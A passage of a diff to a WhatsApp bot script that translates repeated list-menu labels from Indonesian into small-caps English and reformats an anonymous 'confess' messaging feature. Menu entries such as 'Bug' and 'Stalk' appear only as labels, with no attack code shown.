-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -6731,30 +6680,68 @@ const bet = {
 break
 case 'confess': case 'confes': case 'menfes': case 'menfess': {
     hydro.menfes = hydro.menfes ?? {};
-    const session = Object.values(hydro.menfes).find(v => v.state === 'CHATTING' && [v.a, v.b].includes(m.sender));
+
+    const session = Object.values(hydro.menfes).find(v => 
+        v.state === 'CHATTING' && [v.a, v.b].includes(m.sender)
+    );
+
     if (session) {
         const target = session.a === m.sender ? session.b : session.a;
+
         await hydro.sendMessage(target, {
-            text: `📩 Pesan baru dari @${m.sender.split('@')[0]}:\n\n${m.text}`,
+            text: `📩 *New anonymous message*\n\nFrom: @${m.sender.split('@')[0]}\n\n${m.text}`,
             mentions: [m.sender],
         });
-        replyhydro("Pesan diteruskan.");
+
+        replyhydro("✅ Message forwarded.");
         return;
     }
-    const roof = Object.values(hydro.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
-    if (roof) return replyhydro("Kamu masih berada dalam sesi menfess");
-    if (m.isGroup) return replyhydro("Fitur hanya tersedia di private chat!");
-    if (!text) return reply(`Kirim perintah ${prefix + command} nama|nomor|pesan\n\nContoh:\n${prefix + command} ${pushname}|628xxx|Menfess nih`);
-    if (!text.includes('|')) return replyhydro("Format salah! Gunakan format: nama|nomor|pesan");
+
+    const roof = Object.values(hydro.menfes).find(menpes => 
+        [menpes.a, menpes.b].includes(m.sender)
+    );
+
+    if (roof) return replyhydro("⚠️ You are still in an active confession session.");
+
+    if (m.isGroup) return replyhydro("❌ This feature is only available in private chat.");
+
+    if (!text) return reply(
+`⚔️ *Confess Usage*
+
+Send:
+${prefix + command} name|number|message
+
+Example:
+${prefix + command} ${pushname}|628xxx|I have something to tell you...`
+    );
+
+    if (!text.includes('|')) 
+        return replyhydro("❌ Invalid format! Use: name|number|message");
 
     let [namaNya, nomorNya, pesanNya] = text.split('|');
-    nomorNya = nomorNya.replace(/^0/, '62');
-    if (isNaN(nomorNya)) return replyhydro("Nomor tidak valid! Pastikan hanya menggunakan angka.");
 
-    const yoi = `Hi ada menfess nih buat kamu\n\nDari: ${namaNya}\nPesan: ${pesanNya}\n\nKetik:\n${prefix}balasmenfess -- Untuk menerima menfess\n${prefix}tolakmenfess -- Untuk menolak menfess\n\n_Pesan ini dikirim oleh bot._`;
+    nomorNya = nomorNya.replace(/^0/, '62');
+
+    if (isNaN(nomorNya)) 
+        return replyhydro("❌ Invalid number! Use numbers only.");
+
+    const yoi = `💌 *You received a confession*
+
+👤 From: ${namaNya}
+📝 Message:
+${pesanNya}
+
+━━━━━━━━━━━━━━━
+Reply with:
+${prefix}balasmenfess → Accept  
+${prefix}tolakmenfess → Reject
+
+_This message was sent via bot._`;
+
     const tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg');
 
     const id = m.sender;
+
     hydro.menfes[id] = {
         id,
         a: m.sender,
@@ -6762,8 +6749,12 @@ case 'confess': case 'confes': case 'menfes': case 'menfess': {
         state: 'WAITING',
     };
 
-    await hydro.sendMessage(`${nomorNya}@s.whatsapp.net`, { image: tod, caption: yoi });
-    replyhydro("Pesan berhasil dikirim ke nomor tujuan. Semoga dibalas ya!");
+    await hydro.sendMessage(`${nomorNya}@s.whatsapp.net`, {
+        image: tod,
+        caption: yoi
+    });
+
+    replyhydro("✅ Confession sent successfully. Now we wait... 👀");
 }
 break;
 case 'balasmenfess': {
@@ -6820,186 +6811,181 @@ break;
 case 'groupmenu': {
   let HydroSad = `${groupmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -7013,186 +6999,181 @@ break
 case 'funmenu': { 
   let HydroSad = `${funmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -7205,186 +7186,181 @@ break
 case 'stalkermenu': {
 let HydroSad = `${stalkermenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
